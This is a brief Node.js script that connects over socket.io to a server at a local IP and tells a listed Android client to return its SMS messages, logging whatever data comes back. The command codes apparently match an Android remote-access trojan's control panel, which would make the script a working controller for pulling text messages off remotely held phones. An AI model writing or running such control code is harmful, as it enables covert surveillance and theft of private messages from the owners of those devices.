const io = require('socket.io-client');

const SERVER_URL = 'http://192.168.1.101:9400';

console.log('🔌 Connecting to server...');

const socket = io(SERVER_URL, {
    transports: ['polling', 'websocket']
});

socket.on('connect', () => {
    console.log('✅ Connected to server');
    
    // Send SMS command
    console.log('📤 Sending SMS command...');
    socket.emit('send_command', {
        clientID: 'android_1758309836329_rl5633k45', // Replace with actual client ID
        command: {
            type: '0xSM',
            action: 'ls'
        }
    });
    
    console.log('✅ SMS command sent successfully');
    
    // Wait a bit for response
    setTimeout(() => {
        console.log('⏰ Test completed');
        process.exit(0);
    }, 5000);
});

socket.on('disconnect', () => {
    console.log('❌ Disconnected from server');
});

socket.on('connect_error', (error) => {
    console.log('❌ Connection error:', error.message);
    process.exit(1);
});

// Listen for any responses
socket.on('command_response', (data) => {
    console.log('📥 Command response received:', data);
});

socket.on('0xSM', (data) => {
    console.log('📱 SMS data received:', JSON.stringify(data, null, 2));
});
